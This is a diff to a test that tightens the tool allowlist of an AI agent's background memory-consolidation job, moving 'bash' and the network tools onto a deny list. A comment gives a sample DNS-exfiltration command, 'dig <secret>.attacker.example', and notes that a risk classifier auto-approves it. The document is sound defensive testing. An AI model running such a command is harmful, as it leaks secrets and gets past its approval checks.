@@ -562,21 +562,27 @@ describe("memoryV2ConsolidateJob — non-empty buffer", () => {
     expect(allowed).toBeDefined();
     const allowedSet = new Set(allowed);
 
-    // The local file-reorganization surface the pass actually uses.
+    // The local file-reorganization surface the pass actually uses. Page
+    // removal goes through `delete_memory_page` (slug-scoped, no egress), NOT
+    // a general shell.
     for (const tool of [
       "file_read",
       "file_write",
       "file_edit",
       "file_list",
       "code_search",
-      "bash",
+      "delete_memory_page",
       "recall",
     ]) {
       expect(allowedSet.has(tool)).toBe(true);
     }
 
-    // Network egress + host-proxy tools must NOT be reachable.
+    // `bash` must NOT be reachable: a shell reopens the egress channel this
+    // allowlist closes (`dig <secret>.attacker.example` classifies Low and
+    // auto-approves in this background context). Network egress + host-proxy
+    // tools stay out for the same reason.
     for (const tool of [
+      "bash",
       "web_fetch",
       "web_search",
       "network_request",
